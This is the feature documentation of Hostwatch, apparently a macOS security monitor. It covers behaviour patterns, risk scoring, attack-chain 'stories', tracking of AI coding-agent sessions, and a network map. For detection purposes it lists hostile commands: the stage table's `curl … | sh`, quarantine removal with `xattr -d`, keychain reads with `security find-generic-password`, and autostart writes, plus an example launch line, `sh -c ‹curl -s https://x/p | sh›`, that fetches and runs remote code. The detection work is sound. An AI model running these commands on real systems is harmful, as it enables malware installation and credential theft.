## Features

What Hostwatch does for you, in six groups. Each feature starts with a sentence or two, then the details.

### Learns what's normal

Hostwatch builds a picture of how your Mac normally behaves, and asks you only about what's new.

#### Patterns: learn normal, surface the strange

Hostwatch learns what your Mac normally does. Similar events become one pattern ("Slack connects to its servers"),
so you decide once instead of a thousand times, and anything new stands out.

Every event gets a **signature**: a fingerprint of *who did what*. Events with the same signature are grouped into
one **pattern**. There are three kinds:

| Kind | Signature | Example |
|------|-----------|---------|
| process | parent program → executable | `Microsoft Excel → /usr/bin/osascript` |
| connection | process → proto, host bucket, port | `Slack → TCP internet:443`, `curl → TCP 45.33.*.*:8081` |
| file | process → mode, folder or file | `rg → r ~/Documents/work/src/*`, `rg → r ~/todo.txt`, `agent → r ~/.ssh/*  [SSH keys]`, `mds → r *  [ordinary files]` |

**Who did it, for tools and interpreters.** When the program alone says little (node, python, bash and other
shells, git, curl), its pattern also names the app or AI agent behind it: `node via Cursor → r ~/proj/.git/*`,
`zsh via Claude Code → /bin/cat`. A Safe for one says nothing about the other. Who is only named when it's proven
from what the kernel reports: an AI agent above the process, recognised by its code signature (Claude Code), else,
when every process up to launchd is known and none of them looks like an agent, the app macOS holds responsible for
it. Anything not proven (a link not seen, an agent that runs as a script like Codex) names nobody. Decisions made before
patterns named who carry over: each new one starts with the decision its pattern had, and your rules that don't
name who still match the program from anyone. Apps keep their plain patterns.

**Normalization** removes the parts that vary, so similar events really match. Your home folder becomes `~`.
`$TMPDIR`, UUIDs, hex IDs and version numbers become placeholders, in executable names too
(`claude/versions/#.#.#`).

**Fewer patterns where the detail says nothing:**

- **macOS's own programs:** what a program on the sealed system volume reads is one pattern for that program,
  `r *  [ordinary files]`. Which of thousands of system files `mds` or XProtect read says nothing, and nothing can
  change those programs. Kept specific: their writes, sensitive places (SSH keys, keychains, cookies, browser
  logins…), and shells, interpreters and command-line tools in `/bin` and `/usr/bin` (`cat`, `python3`, `zsh`),
  which read whatever a script tells them to.
- **Random temp names:** a file or folder in `/tmp` or `$TMPDIR` named like a temp file (a name, then random letters
  and digits: `zshVJbGMW`, `hostwatch.29Cjgb`) is one pattern per name: `r /tmp/zsh*`.
- **Projects:** what a tool reads inside a git project (the folder with its `.git`) is one pattern per project
  and program: `rg → r ~/Documents/git/devops/**`. Writes stay per folder, as do reads by shells and interpreters
  (`cat`, `python3`), and a project so near the root that its pattern would cover a whole area (never `r ~/**`).
- **Scratch trees:** a tree in `/tmp` or `$TMPDIR` is one pattern per tree: `r /tmp/site-shot/**`.
- **Homebrew:** reads inside a formula's tree are one pattern per formula, interpreters included:
  `Python → r /opt/homebrew/Cellar/awscli/**`.
- **Plain tools:** a shell or interpreter starting macOS's plain tools (`awk`, `cut`, `ls`, `du`…) is one pattern
  per folder: `zsh → /usr/bin/*  (plain tools)`. Tools attackers use (`curl`, `osascript`, `security`,
  `launchctl`, `defaults`…) and admin tools (`sudo`, `chown`, `diskutil`…) keep one pattern each, with their
  arguments.

**Status.** Each pattern has a status: **New / Safe / Suspicious / Dangerous**. It also records who set it (you,
Claude, auto or baseline) and a short reason.

**Risk.** Each new pattern gets a local risk level, computed only from what is in the pattern. Some terms used below:
an *interpreter* or *shell* runs other code (python, bash, node…), and a *LOLBin* is a built-in system tool that
can also be misused (`curl`, `osascript`…).

- **routine:** auto-marked **Safe** (source `auto`). It is never sent to Claude and never highlighted as NEW.
  Routine covers:
  - reads of system, app, cache and container files
  - scratch writes (temp, caches, containers, prefs)
  - anything done by binaries on the sealed system volume, except LOLBins like `curl` and `osascript`
  - launchd/xpcproxy starting system services (one pattern)
  - loopback traffic
  - an app touching its own data.
- **high**, shown with a 🔥:
  - access to a sensitive place by a non-owner
  - persistence writes
  - executables running from temp/Downloads/`/Users/Shared`/volumes
  - GUI apps spawning shells/interpreters/LOLBins
  - LOLBins talking to public IPs on unusual ports.
- **normal:** everything else.

Most patterns turn out routine, so only a small share ever waits for you.

**Seeing patterns and events:**

- **Show filter:** one setting that decides what the HUD, Events and Patterns show, all together. It is the same
  control on the Events and Patterns tabs and in the menu (*View ▸ Show*). The choices:
  - *All Activity*.
  - *Only New (not reviewed)*: unclassified, plus Suspicious/Dangerous decided only by an AI or the baseline.
  - *Only Important*: flagged plus new high-risk.
- **First sighting:** the event that first shows a pattern is tagged ✦ (Events) or **FIRST** (HUD). The *New*
  status means the pattern isn't decided yet.
- **Row colours:** flagged rows get a red or orange stripe, safe rows a green one.
- **Columns:** drag a header edge to resize a column, drag a header to reorder, click it to sort and again to
  reverse. Each table remembers its sort. Widths are not remembered between launches.
  - Events show Time · Kind · Status · Process · PID · PPID · Detail.
  - Patterns show Status (🔥 = high-risk) · Kind · Process · Pattern · Decided By · Signer · Reason · Count ·
    First Seen · Last Seen.
- **Ask the AI:** double-click a row to ask the AI (the engine you picked).
- **Searching and marking:** Patterns can be searched and multi-selected. Right-click to mark one or many
  patterns, or **Mark All … From This Process** as a whole-process rule.
- **Decided By** column: *You*, *Rule: …*, *Baseline: Slack (…)*, *AI (on-device)* / *AI (Claude)*, *AI suggests
  Safe* (waiting for you), *Automatic (routine)* or *New*. *Needs You* in the sidebar lists what waits for you.

**Group** (*No Groups*, *By Process*, *By AI Session*, the same control as on Events) is *By Process* by default: one
row per program (by name), with its patterns under it (*By AI Session* groups them by the coding-agent session that
produced them instead, see [AI sessions](#ai-sessions-what-claude-code-did)). The program's row shows:

- the most serious status and risk among its patterns
- how many are New
- the kinds of activity
- the total count and first/last seen.

A program with one pattern stays a plain row. Marking, deleting or asking about a program's row acts on all its
listed patterns. Right-click it for *Show Only* that program.

**Reading a pattern.** The Pattern column wraps (up to three lines), and hovering it says what it means in plain
words (*reads anything under ~/Documents/work*). The **inspector** (the sidebar button at the right of the toolbar,
shown by default) has the selected pattern in full: the plain words, the pattern and program as selectable text, who
decided it and why, the AI's suggestion, count and exact first/last times, the last example it was seen in, the
program's signature, and Safe / Suspicious / Dangerous buttons. With several rows selected it marks them all.
Clicking the selected row again deselects it (Escape clears the selection), and an empty list says why.

**More in the Patterns tab:**

- Status tally chips at the top.
- Right-click **Copy Pattern**, **Copy Program Name(s)**, **Ask AI About This Pattern…**, **Delete Pattern** /
  **Delete Selected Patterns**.
- The toolbar's **Delete All N Patterns** starts over (asks first).

**One-offs.** A one-off is a pattern seen only once that is not high risk, not Suspicious or Dangerous, and not
decided by you or your rules. Examples: a command typed once, a one-time connection. It is recorded like any other,
so detection works the first time.

- **Hidden by default:** the Patterns tab hides it unless **Seen Once** is on. Search and scoped lists find it anyway.
- **Removed after 7 days:** tidying removes it when it hasn't happened again for 7 days, if it's undecided or Safe
  only automatically (routine), unless an open story uses it. Ones an AI or the baseline decided stay.
- **If it comes back:** it's simply new again.

**AI suggests, you decide.** An AI can propose a status for New patterns, but you stay in charge:

- **Asking:** *Ask AI for Suggestions* (Patterns ▸ Needs You) sends up to 40 New patterns (high-risk first, then most
  recent), with code-signing facts, to the on-device model and/or Claude. For Claude that's one call, about 8 s and
  $0.03.
- **Suggestions only:** each verdict is stored as a **suggestion** on the pattern. Nothing changes until you
  **Accept** it.
- **Automatic suggestions:** *Suggest for new patterns automatically* (Settings ▸ AI) repeats this every 90 s for
  patterns older than a minute.
- **Automatic accept:** *Accept AI suggestions without asking* applies them by themselves, except for high-risk
  patterns.
- **Classify with AI** (Events and Patterns toolbars) does it for every New pattern that no AI has looked at. It
  works in batches of 40, high-risk first, with a progress bar and Cancel. The popover shows the count, the engine
  and the rough cost (on-device free, Claude about $0.03 per batch). It also lets you choose whether to **apply the
  verdicts** or **keep them as suggestions**. A failing Claude (offline, not installed) stops the run.
- **Limits:** no AI overrides a decision you made or suggests Safe for a high-risk pattern. No AI trusts an
  interpreter, shell or similar tool (python, bash, node, curl, osascript…), because they run whatever they're told.
- **Ask AI:** a single **Ask AI** verdict also becomes a suggestion for that event's pattern.

**Combining patterns.** You can merge several similar patterns into one, so you decide about them together:

1. Select two or more patterns of one kind in Patterns.
2. Right-click (or *Mark Selected*) ▸ *Combine… into One Pattern*.
3. A sheet proposes the shared pattern: their common shape, token by token, with `*` where they differ
   (`r ~/Documents/work/alpha/*` + `…/beta/*` → `r ~/Documents/work/*/*`). You can edit the program and the pattern.

The combined pattern must cover every chosen pattern and stay specific (the general rule below, bare wildcards
refused). What happens next:

- **Merging:** every existing pattern it covers is merged too. Counts add up, and first and last seen span them.
- **Status:** the most serious status wins (Dangerous, then Suspicious, and New when Safe and New are mixed).
- **New activity:** from then on, activity whose own pattern it matches joins it instead of creating a new one.
  Rows already on screen follow it.
- **Undo:** *Separate Combined Pattern* undoes it. New activity makes its own patterns again.

**The general rule: no pattern covers a whole area.** This applies to every program. In file patterns, `r` is the
mode (read).

- **Wildcard depth:** a wildcard needs at least 2 folders below home (`~/Documents/work/*`) or 3 elsewhere
  (`/Users/Shared/tools/*`).
- **Shallow files:** a file in a shallower folder is its own pattern (`r ~/todo.txt`, `r ~/Documents/a.pdf`,
  `r /tmp/x.log`, `r /usr/bin/ls`).
- **Deep trees:** patterns name the file's folder. For apps, trees deeper than 4 folders below home (5 elsewhere) end
  in `/**` there (`~/Projects/app/node_modules/a/**`). Interpreters and shells always get the exact folder.
- **Never allowed:** `r *`, `r ~/*`, `r ~/Documents/**`, `r /*`, `r /tmp/*` or `r /Users/**` never exist and can't
  be a learned Safe rule. *Mark All … From This Process ▸ Safe* is always greyed out. Suspicious or Dangerous for a whole
  program still work.

Labelled places:

- **sensitive places**, for any access: SSH/GPG keys, cloud and registry credentials, keychains, TCC, cookies,
  Safari/Mail/Messages data, browser credential stores, local accounts, sudoers. These are tagged `[label]`.
- **autostart locations**, for writes only: LaunchAgents/Daemons, cron/at/periodic, login items and shell rc files.
  These are tagged `[persistence]`.
- **an app's own data folder**: `~/Library/Application Support/<App>` or `~/.<app>`, when the name matches the
  actor. These are tagged `[own data]`.

**Connections:**

- Public IPs on web ports (80/443/53/853/123) become `internet`. Other ports keep the /16.
- Loopback, LAN, link-local, CGNAT and multicast are named.
- Ports ≥ 49152 become `ephemeral`.

**Interpreters and tools** get extra care, because they run whatever they're told:

- **Launches name what was run:** launches of interpreters and tools (perl, python, bash, ditto, curl, osascript…)
  name what was run, not just the program.
  - For an interpreter, the script: `bash → /usr/bin/perl ~/bin/build.pl`.
  - For `-c`/`-e`, the code, first 80 characters: `sh -c ‹curl -s https://x/p | sh›`.
  - Otherwise the arguments, with paths and numbers normalised, up to ~120 characters:
    `ditto -x -k ~/Downloads/app.zip ~/Downloads`.
  - A bare program run alone stays as it is.
- **Network and files:** for interpreters and shells, network patterns name the destination's domain
  (`TCP pythonhosted.org:443`) or address, never `internet`. File patterns use the exact folder even in deep trees.
- **No wholesale trust:** a learned Safe rule that covers them broadly is refused. The baseline never trusts them,
  macOS's own `/bin/bash` or `/usr/bin/python3` included.

**Built-in safe patterns.** Some of macOS's own behaviour is the same on every Mac, so it is decided as routine out
of the box:

- any program *reading* `~/.CFUserTextEncoding` (CoreFoundation's text-encoding preference)
- `/usr/sbin/networksetup` running `/bin/sh -c ‹/bin/cp …/SystemConfiguration/preferences.plist …›` (its settings
  backup)
- `sh`/`bash /usr/libexec/tmp_cleaner` (Apple's temp clean-up script)
- SystemUIServer running `screencapture …com.apple.screenshot.launcher…` (a screenshot you took).

Only exact patterns count. When a parent is named, it must be that program on the sealed, read-only system volume.
A copy elsewhere, or the same command from another program, doesn't count. Signing still applies (a swapped binary
is high-risk), and stories ignore automatic decisions.

Your own developer activity (scripts, hooks, `kubectl`, `codesign`…) isn't universal, so it's not built in. Mark
it, combine it or let rules learn it.

**Code signing** refines the risk level. It looks only at the binary the pattern names (what runs, or what acts).
Each binary is inspected once per version: signed or not, ad-hoc, Apple, Team ID, organisation, CDHash, quarantine
flag. Its signature is fully validated in the background, and checked again when the file changes.

- **Unsigned or ad-hoc code that is quarantined or runs from a download/temp folder** → high. Unsigned code
  elsewhere (Homebrew, your builds, bundled runtimes) is left to the path rules.
- **Apple or a trusted developer** doing non-sensitive things → routine. Sensitive places, autostart writes and
  spawning shells/LOLBins keep their rules.
- **Signature no longer matches the binary** (modified) → high.
- **Binary replaced:** a known path whose signer changes in a way an update wouldn't explain → high, plus a Stories
  stage. That means signed → unsigned/ad-hoc, Apple → non-Apple, or a different Team ID.
- **Trusted developers** start as the Team IDs of the signed, non-quarantined apps already in `/Applications` (your
  baseline). New vendors stay untrusted until you right-click a pattern → **Trust Developer “…”**. Remove one with
  **Stop Trusting**. Patterns are re-scored right away. Facts are saved in
  `~/Library/Application Support/Hostwatch/signing.json`.
- **Homebrew tools:** Homebrew ad-hoc-signs what it builds, so signing can't vouch for `git`, `kubectl`, `fish`….
  They're judged by the path rules like your own builds, and you decide their patterns.

**Tidying (routine noise only).** Hostwatch tidies 30 seconds after launch and then daily. Routine Safe patterns are
the ones decided automatically as ordinary: system reads, caches, scratch writes. Tidying does two things:

- **Removes old ones:** routine Safe patterns not seen for 30 days are removed. They come back if they happen again.
- **Folds look-alikes:** routine Safe patterns of one program that differ only in random parts (`cache-aB#dE#`,
  `<hex>`, `<uuid>`, a long mixed-case code) are folded into one combined pattern, marked automatic. A fold needs at
  least 3 patterns, must pass the general rule and may cover nothing but routine Safe patterns.

Nothing New, reopened or decided by you, a rule, the baseline or an AI is touched. If activity that joins a fold
later isn't routine, the fold goes back to New. The Patterns footer shows the last result.

**Where patterns are saved:** `~/Library/Application Support/Hostwatch/signatures-v2.json`, plus a journal of recent
changes (`signatures-v2.journal`).

#### Patterns and Protection tabs

The *Patterns* tab is everything about patterns: the table of all of them, what's waiting for you, the rules that
decide for you, and everything you've already decided. The *Protection* tab is what protection does with those
decisions.

Every pattern is decided by **you**, a **rule** (learned or baseline), or an **AI suggestion** you accepted. That is
also the order of authority: you come first. Both tabs have a sidebar. *Patterns* holds All Patterns (the table),
Needs You, Rules and Decisions, and its tab badge counts what waits in Needs You. *Protection* holds Overview,
Protected Files and Folders, Network Firewall and Found (see Launch and file protection). Only Needs You and Found
carry a badge, because only they wait for you.

- **Needs You:** what waits for your decision, updated live. Interpreters, shells and Hostwatch itself aren't
  listed. It shows:
  - New patterns, one row per app with its reasons.
  - The AI's suggestions (*AI suggests: Safe ×3 · on-device AI*) with **Accept**, **Trust**, **Dismiss** and *⋯*
    (Show in Patterns, Mark Suspicious).
  - Claude's rule proposals, with **Approve** / **Reject**.
- **Rules:** baseline rules (code signatures, no AI: **Update Baseline**) and learned rules (**Suggest Rules…**).
- **Decisions:** who decided which patterns, by app. The groups are *Patterns AI decided*, *Patterns you decided*
  (one by one, each covers only itself), *…decided by learned rules* and *…decided by baseline rules*. AI and your
  decisions each have **Undo** (back to New).
- **In plain words:** every learned rule and proposal reads as a sentence: *who* does *what* → *what happens*,
  e.g. **git** reads anything under ~/Documents/MyApp → **Safe: decided for you, never asked about, left out
  of Stories**. A proposal also lists *If you approve*: how many New patterns change now, that future matches are
  decided without asking, and how many of your decisions it agrees with. *Details* shows the exact match (kind ·
  program → pattern). A baseline rule says what it trusts: the kinds of behaviour the app showed in its first week,
  as long as its signature matches.
- **N patterns ›:** every row (needs-you apps, baseline and learned rules, decided groups) has *N patterns ›*. Click
  it to list those patterns in place: high risk first, up to 40, with *Open in Patterns* for all of them.

#### Rules learned from your decisions

Mark a few patterns yourself and Claude suggests rules that decide similar ones for you. Each rule is checked against
your own decisions, and nothing changes until you approve it.

How to use it:

1. Mark a few patterns yourself.
2. Click **Suggest Rules…** (Patterns ▸ Rules ▸ Learned rules).
3. Review the proposals that pass the checks. **Approve** applies a rule. **Reject** drops it.

Approved rules are saved in `rules.json`. Suggesting rules needs Claude, so it's disabled when the engine is *Apple
On-Device*.

**What is sent:**

- your decisions (patterns *you* marked), with secrets masked
- your existing rules
- the story chains you muted and the signs you marked *Not a Threat*.

Claude's own verdicts are deliberately not used, so rules don't amplify the AI.

Your **Safe** decisions are sent only for **regular** patterns: seen at least 5 times, the first and last time at
least an hour apart. A Safe rule stops questions for good, so it must stand on behaviour that keeps happening.
Dangerous and Suspicious decisions are always sent, because something that ran once may be exactly what to catch
again.

**What comes back:** up to 8 rules. Each has a kind (exec/net/file/any), a program and a pattern (`*` and `?` as
wildcards, case-insensitive) and an action (Safe/Suspicious/Dangerous), with a short rationale.

Every proposal is checked on your Mac before you see it:

| Check | Effect |
|-------|--------|
| matches one of your decisions with a different status | **refused** (conflict) |
| program and pattern both name fewer than 4 letters/digits | **refused** (too general) |
| matches no pattern, or > 25% of all patterns (with ≥ 200 patterns) | **refused** |
| based on none of your decisions | warning |
| a Safe rule covering New high-risk patterns | warning (shows how many) |
| a Safe rule covering an interpreter or shell broadly (program or pattern < 4 letters) | **refused** |
| a Safe rule whose matching decisions are all on patterns seen < 5 times or within an hour | **refused** (not regular) |

**While it runs:** **Needs You** shows a progress card with how many of your decisions were sent, a live timer and
**Cancel**. The Patterns tab reads *Patterns (…)*. Afterwards a result line says how many proposals came back and how
many passed the checks, or why none did.

**Precedence**, from strongest to weakest:

1. your markings and the baseline
2. your rules
3. Claude/on-device verdicts
4. automatic routine.

A rule's verdict counts as yours. It satisfies *Only New (not reviewed)*, and a Safe rule removes matching steps
from Stories.

**Each rule keeps checking itself.** At approval, a rule stores the decisions it must keep matching (examples) and
those it must never match (all your other decisions). It is re-checked at launch and whenever you mark something.

- **Paused:** if it now matches a counter-example, loses an example, or contradicts any of your decisions, it is
  **paused** with the reason.
- **Resume or delete:** it stays paused until you resume it (if it passes again) or delete it.
- **Effect:** patterns a paused or deleted rule had classified go back to their own state.

### Connects the dots

One event rarely means much on its own. Hostwatch links related ones into a story.

#### AI sessions: what Claude Code did

A coding agent (Claude Code, the Cursor agent, Codex, Gemini CLI) is one process that starts many others: shells,
`git`, builds, `curl`. Hostwatch follows each agent process and its whole tree as one **session**, so you can see
what one session did, not just what `zsh` or `git` did in general.

- **Events ▸ Group:** *No Groups*, *By Process* or *By AI Session*, next to the Show buttons. *By AI Session* gives one
  row per session with its events under it, the rest under *No AI session*. A session row is a band across the
  list, the way `claude --resume` lists sessions: the maker's mark, the topic, then *MyApp · main · 12 min ·
  5 conn*, and on the right *Only this session* (the list keeps only that tree, *All sessions* takes it off),
  *Patterns*, the worst status among its events and their count. Groups open when shown (one you fold stays folded
  while the window is open). Right-click a band for the same actions and the Claude session id.
- **The maker's mark:** a small mark of the agent's maker drawn by Hostwatch: Anthropic's logomark for Claude Code,
  OpenAI's knot for Codex, Google's four-colour G for Gemini CLI, a cube for the Cursor agent. It appears on session
  bands and next to the kind of an agent's event.
- **The topic:** Claude Code's title for the session (or a title you set yourself, which wins), else the first
  prompt, else the project folder. The branch comes from the same place. Claude titles a session a few turns in, so
  Hostwatch keeps looking until it finds the title.
- **Finding the topic:** with the Claude Code guard on, the guard tells Hostwatch which transcript belongs to the
  session. Without it, Hostwatch finds the transcript under `~/.claude/projects/` (in a folder named after the working
  directory) that started with the session. A session with no topic yet is named by where and when it started
  (*Claude in ~, 16:24*).
- **How events are matched:** by process lineage at the moment each event arrives. A child that detaches and is
  adopted by `launchd` keeps its session. An agent started by an agent (a sub-agent) is part of the outer session.
  Claude Code's own helper processes aren't sessions.
- **Agents already running when Hostwatch starts** are picked up from the process list (once a minute, or every few
  seconds while Running Now is open).
- **Running Now ▸ Group:** the same control groups the running processes under their parent process (*By
  Process*) or under the AI session they belong to (*By AI Session*), with CPU, memory, threads and writes added up
  per group and the count of processes in the PID column.
- **Patterns ▸ Group ▸ By AI Session:** one band per session with the patterns it produced under it, the rest under
  *No AI session*. The band offers *Mark all Safe…* (after asking) for everything the session did so far.
- **Everywhere else:** in the Events table an agent's event carries the maker's mark next to its kind (the session
  is in the tooltip), a destination on the Network tab that a session reached carries a *via Claude · MyApp* tag,
  and a story that happened inside a session starts with its name. In Time Travel, sessions are rebuilt from the
  recorded process starts, so the grouping works for yesterday's sessions too.
- **For Claude:** the MCP tool `agent_sessions` lists them, and `trace_process` with a session's pid shows what it did.
  The list is saved in `agent-sessions.json` while Hostwatch runs.

#### Stories: chains, not single events

Attacks are rarely one event. Hostwatch links small, harmless-looking steps of one program and its children (a
download, a shell, a new login item) into one story, and warns you when they add up.

Hostwatch tags suspicious **stages** and adds up their weights per **process tree** over a 15-minute window. A
process tree is one program and the processes it started.

| Stage | Example | Weight |
|-------|---------|--------|
| Download | write into `~/Downloads`, `/Users/Shared` | 1 |
| Quarantine removed | `xattr -d com.apple.quarantine …` or `xattr -c(r) …` (not `-p`/`-l`) | 3 |
| Ran downloaded/temp file | exec from Downloads, temp, `/Users/Shared`, volumes | 2 |
| App spawned shell | Slack/Office/a browser starting `sh`, `python`, `osascript` | 3 |
| System tool | `curl`, `nc`, `osascript`, `base64`, `security`, `launchctl` … | 1 |
| Encoded/piped command | `curl … \| sh`, `base64 -d`, `osascript -e`, `python -c` code that decodes, runs something or goes online (not one reading JSON) | 3 |
| Autostart write | LaunchAgents/Daemons, login items, shell rc files | 4 |
| Credential access | keychains, SSH/cloud keys, browser stores, `security find-generic-password` (unless a trusted signed parent reads its own item, or a tool reads its own sign-in: `aws` in `~/.aws`, `kubectl` in `~/.kube`, `gcloud`, `az`, `gh`, `docker`) | 3 |
| Outbound connection | to a public IP/host. Shown in the chain, never counted | 0 |
| Unsigned download ran | unsigned/ad-hoc code, quarantined or in a download/temp folder | 3 |
| Binary replaced | a known path whose signer changed (see Code signing) | 5 |
| New domain | first contact with a domain after the baseline (see New domains). Not for web browsers: reaching new domains is what browsing is | 2 |
| Beaconing | steady-interval contacts from an untrusted program or to a raw IP/new domain | 3 |
| Raw-IP connection | public IP, unusual port, no DNS answer, untrusted program | 2 |
| On a blocklist | a HaGeZi match, or an address-only match other than Feodo Tracker's (see Threat lists) | 3 |
| Known malware | a malware tracker's exact domain, a Feodo Tracker address, or a known malware file | 8 |

**Where you see stories:**

- **Banner:** a pinned banner at the top of the HUD. Double-click it to open it.
- **Stories tab:** the full timeline. **Ask AI** sends the whole chain.
- **Sound:** a sound plays when a story first fires.
- **Menu:** **Stories** in the menu.

**What you can do in a story:**

- **Not a Threat:** the story goes, and its exact signs never count again: this program with this destination, folder
  or command. The same program doing anything else, or another program doing this, still counts. Settings ▸
  Detection ▸ *Marked not a threat* forgets them all.
- **Delete:** the trash button deletes it.
- **Related:** *Possibly related (within 30 min, no direct link)* lists stories that may belong to the same attack.

**When a story fires:**

- **Two signs from two events:** one event is one piece of evidence, however many stages it shows. A listed
  connection is not also a second sign by being a connection.
- **Normal trees:** at least two stages, score ≥ 5, and a strong stage (quarantine removal, encoded command,
  autostart, credentials) or an app spawning a shell.
- **Your own terminal/IDE:** trees started there need score ≥ 6 with a strong stage. So `go run` from `$TMPDIR` plus
  `curl` stays quiet.
- **Dangerous:** at score ≥ 8, or autostart + network, or quarantine removal + running the file.
- **Everyday signs don't count:** a pattern seen for three days or more and at least ten times, and not in doubt (not
  Suspicious or Dangerous, not sent back to you), is everyday on this Mac. Its weaker signs are shown in the chain as
  *Everyday on this Mac, not counted*. Threat matches, swapped or unsigned binaries, autostart writes and quarantine
  removal always count.
- **Once a day:** the same threat-list match for the same program joins the story already told that day, quietly.

**How trees are formed:** each app action, launchd job, or command typed in a terminal is its own tree. Its children
stay together. A file written by one tree and then run (or un-quarantined) by another joins the stories. Browser
`.crdownload` files are matched too, e.g. *Google Chrome → xattr → Cleaner*: download · quarantine removed · ran it ·
LaunchAgent · beacon.

**Your Safe marks:** patterns **you** marked Safe never feed stories. Claude/baseline verdicts do, because they judged
one step alone.

**Command lines:** new processes carry their **command line**, shown in the Activity list and given to Claude.
Secrets like tokens, passwords and URL credentials are masked.

#### Story window

Double-click a story (or **Show Chain**) to read it like a timeline: what ran, what it did, and why each step counts.

- **Each step** shows its time, its stage (coloured for strong stages) and one sentence, such as "sh started curl",
  "curl connected to evil.example:443" or "sh wrote ~/Library/LaunchAgents/x.plist". It also shows the command line
  or address, and why it counts.
- **Lineage:** steps are indented by process lineage, so a child runs below its parent. A *Processes in this chain*
  tree lists them with their signers.
- **All activity** adds everything those processes did from a minute before to two minutes after the story. It comes
  from history, or from what's still in memory when history is off. These events are dimmed between the suspicious
  steps.
- **Per step:** double-click or right-click a step to ask AI about it, show it in the timeline, or copy it.
- **At the bottom:** *Ask AI About This Story*, *Show in Timeline*, *Dismiss* and *Not a Threat*.

### Watches the network

Every connection and domain, and a firewall that can ask before anything new goes out.

#### Network: new domains

Every website and server your apps talk to, in one list. A domain your Mac has never contacted before is marked new.

Hostwatch keeps an inventory of every **registrable domain** your programs connect to. That is the name someone
registers, so `edge.slack.com` is listed as `slack.com`. For each domain it records first and last seen, the connection
count, the hostnames and the programs. The list is saved in `~/Library/Application Support/Hostwatch/domains.json`.

- **Counted:** hostnames confirmed by DNS, or named on the command line (inferred connections).
- **Not counted:** reverse-DNS provider names, IP-only connections, `.local`/`.arpa` names, and macOS system daemons.
  The daemons talk to Apple constantly.

**How Hostwatch learns what's normal.** On first launch, every domain in recorded history counts as known. The next
**hour** is a learning period. To stop it early, use Network tab → *End Learning Now* (or *End Now* in Settings ▸
Detection).

Some domains are not learned, even during learning. A domain first reached by unsigned, ad-hoc or quarantined code, or
by a program in Downloads / Shared / a volume, stays new.

**What happens with a new domain.** A domain first contacted after this baseline is new. For **1 hour**, its
connections carry a purple **NEW DOMAIN** badge in the HUD and the Events list. During that time they:

- **Pass filters:** they pass *Only Important* and *Only New*.
- **Feed Stories:** they add a **New domain** stage (weight 2) to Stories. For example, *Slack → sh → curl* fetching
  from a never-seen domain is Dangerous.

**The Network tab.** Open it with ⌘5, or *Network* in the menu, which shows a badge. It is one timeline of
destinations, newest first. Each row is a domain, or an address without a name.

- **Columns:** Last Seen · Destination · Firewall · Domain · Programs · Connections · First Seen. Every column sorts.
- **Domain status:** New, Seen, Known, Baseline, or on a threat list.
- **Firewall:** what the firewall does there. Passes, Asks or Would ask, Blocks or Would block, Blocked by you,
  Waiting for you.
- **Waiting connections:** connections held in Ask wait in a strip on top.
- **Filters:** All, New Domains (first seen in the last 24 h), Blocked & Undecided. The filter you picked is
  remembered.

Open a row to see the programs that connected, with **Block** / **Allow**. These mark the pattern, as in Patterns. On a
blocked destination you get **Allow Instead**, and **Show Program in Finder** takes you to the program.

**On a threat list.** A destination a threat list names is blocked whatever you decided, and says *On a threat list*
with the list's reason. Shared hosts (GitHub's raw files, cloud storage) are sometimes listed for one bad file:
*Allow Anyway…* asks once, explains the risk, and then lets that one program reach that domain: an Allow on the
program's card in *Network Firewall ▸ App rules*. *Undo Allow Anyway* takes it back.

Right-click a row to **Mark Known** or mark as not known, to Block or Allow, to copy, or to **Forget** the domain.

**Block one domain for one app.** Block and Allow decide the connection's pattern, and an ordinary app has one
pattern for the whole web (`TCP internet:443`): blocking it stops the app everywhere. To stop an app reaching just
one domain, right-click the domain ▸ *Block for an App* and pick the app (the apps that reached it are listed), or
right-click one of its connections ▸ *Block example.com for Slack*. The rule covers the domain's hosts
(`api.example.com` counts under `example.com`), comes before any pattern status (a Safe pattern doesn't let it
through), and shows as *Blocked by you* with an **Unblock** button. It stops connections in Ask and Strict. In Watch
it shows what it would block. A connection already open finishes, and one let through in the last five minutes may
pass until that answer runs out.

**Forget** does three things:

1. The domain is new again next time.
2. Its connections leave the firewall list.
3. The Allow or Block you gave them in the firewall (question, Network tab) is reset, so they're asked about again.

Decisions made in Patterns stay. A firewall decision is per pattern, so other destinations of that pattern are asked
again too.

#### Network map: who reaches this Mac

The Network tab opens on its **Map** (the *Map | List* switch at the top left, which remembers your choice). It draws the same connections as a picture, with what
the list can't show: who tried to reach this Mac.

- **Four columns, left to right:**
  - **Reaching this Mac:** devices on your network (the router, phones, computers) and addresses on the internet that
    tried to connect.
  - **This Mac:** programs listening to the network, with *All networks* in orange when anyone on a network this Mac
    joins can reach them, then the programs going out.
  - **Way out:** Wi-Fi or Ethernet through the router, a VPN, or your network directly. A VPN that carries only some
    destinations (a split tunnel to a company's 10.x network) is its own way out, and those addresses are destinations
    behind it, not devices on your network.
  - **Destinations:** grouped by domain, blocked and new ones always in view.
- **Lines:** thicker for more connections. Grey is allowed, red dashed is blocked or refused, orange is new in the last
  day. Every state also has a word or badge.
- **Every connection out** is drawn, allowed or not: a connection to a device on your network (`ssh` to a server at
  home) ends at that device, by name and address.
- **What each device is:** its maker from the first half of its hardware address (IEEE's public registry, shipped with
  Hostwatch, never looked up online) and its model and name from what it announces on your network (Bonjour: "iPhone",
  "MacBook Pro", "Apple TV", a printer's model, a Chromecast). Phones use a private, made-up hardware address per
  network, which has no maker. Their announcement still names them.
- **Select anything** to dim the rest and follow its flow: a destination shows the programs that reached it (even ones
  folded into "and 18 more") and the way out each used. A program shows its own destinations, a way out its programs
  and destinations. Only the busiest that fit are drawn, the rest fold into "and N more", and the details panel lists
  them all. Click an empty spot to clear the selection.
- **Filters:** Everything, Going Out, Coming In, Your Network. **Range:** Last Hour, Today, Last 7 Days.
- **Show more:** a column shows its first few, and more when the window is taller. Click *and 12 more devices* (or
  programs, destinations, addresses) and the map makes way for all of them in a table, with each one's address,
  connections and status, the details panel beside it and the same right-click menu. The window's search filters it,
  and *Map* goes back. Each way out always keeps its busiest destinations in view, so a VPN's few connections never
  hide behind the Wi-Fi's many.
- **Home and work:** a network is known by its router. When the Mac moves, the map shows the devices of the network
  it is on now, whatever its range (10.x, 172.16.x, 192.168.x or a company's own). The first look at a network is its
  baseline, so arriving somewhere new doesn't mark everyone there as new, and a different router at the same address
  (192.168.1.1 at home and at work) is not a *Router changed* story. That story needs the devices around the router
  to be the same ones.
- **Block from the map:** right-click anything.
  - **A device or an address:** *Block This Device* stops everything from it and to it, whatever the firewall's mode.
    A device is blocked by whatever address it has on the network it's on. The router can't be blocked: that would cut
    this Mac off.
